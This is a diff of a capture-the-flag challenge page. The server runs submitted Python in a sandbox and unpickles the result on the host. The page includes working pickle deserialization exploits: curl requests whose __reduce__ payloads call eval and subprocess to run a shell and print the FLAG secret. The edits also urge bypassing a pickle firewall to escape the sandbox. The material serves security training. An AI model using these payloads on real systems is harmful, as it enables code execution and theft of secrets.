@@ -18,11 +18,11 @@
     <div class="section">
         <h2>Challenge Description</h2>
         <p>Your goal is to capture the flag (stored in the FLAG environment variable on this VM).</p>
-        <p>This server accepts Python code, sends it to a Modal Restricted Function for execution, and then processes the result.</p>
-        <p>The server can run in two modes:</p>
+        <p>This server accepts Python code, sends it to a Modal Restricted Function (used as a sandbox) for execution, and then processes the result.</p>
+        <p>This server can run in two modes:</p>
         <ul>
             <li><strong>VULNERABLE Mode:</strong> Pickle deserialization attacks work (standard CTF challenge)</li>
-            <li><strong>SECURE Mode:</strong> rfmodal's pickle firewall blocks standard attacks (find another way!)</li>
+            <li><strong>SECURE Mode:</strong> rfmodal's pickle firewall blocks standard attacks</li>
         </ul>
     </div>
 
@@ -30,7 +30,7 @@
         <h2>Check Server Mode</h2>
         <p>First, check which mode the server is running in:</p>
         <div class="code-block">curl [YOUR_URL]/mode</div>
-        <p>This will tell you if pickle attacks will work or if you need to find another approach.</p>
+        <p>This will tell you if standard pickle attacks will work or if you need to find another approach.</p>
     </div>
 
     <div class="section">
@@ -43,9 +43,9 @@ f"MODAL_FUNCTION_RUNTIME: {os.environ.get('MODAL_FUNCTION_RUNTIME', 'not set')}"
 EOF</div>
     </div>
 
-    <div class="section vulnerable-mode">
-        <h2>🔓 Vulnerable Mode: Pickle Deserialization Attack</h2>
-        <p>If the server is in VULNERABLE mode, these exploits will capture the flag:</p>
+    <div class="section">
+        <h2>Pickle Deserialization Attack</h2>
+        <p>If the server is in VULNERABLE mode, these exploits will capture the flag. In SECURE mode, they should not work.</p>
         <p><strong>Example 1:</strong></p>
         <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
 class FlagExploit:
@@ -59,31 +59,17 @@ EOF</div>
         <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
 type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n \"The flag is: $FLAG\"']).decode()",))})()
 EOF</div>
-        <p>The server will return pretty-printed JSON with the flag in the "result" field.</p>
-    </div>
-
-    <div class="section secure-mode">
-        <h2>🔒 Secure Mode: Advanced Challenge</h2>
-        <p>If the server is in SECURE mode, the pickle attacks above will be blocked by rfmodal's firewall.</p>
-        <p>You'll see an error like:</p>
-        <div class="code-block">{
-  "success": false,
-  "error": "Failed to execute code: [firewall blocked]",
-  "mode": "secure",
-  "firewall_blocked": true,
-  "hint": "The pickle firewall blocked your attack. This is expected in secure mode!"
-}</div>
-        <p><strong>Your challenge:</strong> Find another way to exploit the system... if one exists!</p>
-        <p>Hint: The rfmodal firewall is designed to be secure. There might not be a bypass. That's the real challenge!</p>
+        <p>In VULNERABLE mode, the server will return pretty-printed JSON with the flag in the "result" field.</p>
     </div>
 
     <div class="section">
         <h2>Rules</h2>
+        <p>The goal is to escape from the sandbox and capture the flag that lives on the host VM.</p>
         <ul>
             <li>The flag is stored in the FLAG environment variable on the host VM</li>
             <li>The Modal function runs with restrict_modal_access=True and block_network=True</li>
             <li>Code executes in a Modal container, results are processed on the host</li>
-            <li>In SECURE mode, standard pickle exploits are blocked - be creative!</li>
+            <li>In SECURE mode, we try to block standard pickle exploits; find a way to bypass the firewall.</li>
         </ul>
     </div>
 
